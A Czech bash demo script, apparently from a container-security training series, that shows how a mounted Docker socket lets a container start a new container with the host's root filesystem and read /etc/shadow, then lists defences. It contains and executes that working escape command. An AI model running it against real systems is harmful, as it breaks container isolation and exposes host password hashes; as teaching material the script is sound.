#!/usr/bin/env bash
# 03 — ÚNIK #3: namountovaný /var/run/docker.sock = root na hostiteli.
# Velmi častá chyba u CI runnerů a "docker-in-docker" návodů.
set -euo pipefail
source "$(dirname "$0")/lib.sh"
require_docker

bad "Scénář: kontejner má namountovaný /var/run/docker.sock (CI agenti, monitoring, portainer...)."
say "Kdo ovládá docker.sock, ovládá démona = může spustit jakýkoli kontejner s jakýmkoli mountem."
pause

echo
say "Z 'vnitřního' kontejneru spustíme NOVÝ kontejner s připojeným / hostitele a přečteme /etc/shadow:"
cat <<'EOS'
$ docker run --rm -v /var/run/docker.sock:/var/run/docker.sock docker:cli sh -c '
    docker run --rm -v /:/host:ro alpine:3.19 head -n 5 /host/etc/shadow'
EOS
run docker run --rm -v /var/run/docker.sock:/var/run/docker.sock docker:cli sh -c \
  'docker run --rm -v /:/host:ro alpine:3.19 head -n 5 /host/etc/shadow'
echo
bad "Přístup k socketu obešel veškerou izolaci původního kontejneru."
pause

echo
good "Obrana:"
echo "  • Socket nemountovat vůbec."
echo "  • Když CI opravdu potřebuje build → použij rootless builder (buildkit/kaniko) nebo"
echo "    docker-socket-proxy s povolením jen čtených endpointů."
echo "  • Nikdy nedávej socket do kontejneru dostupného z internetu."
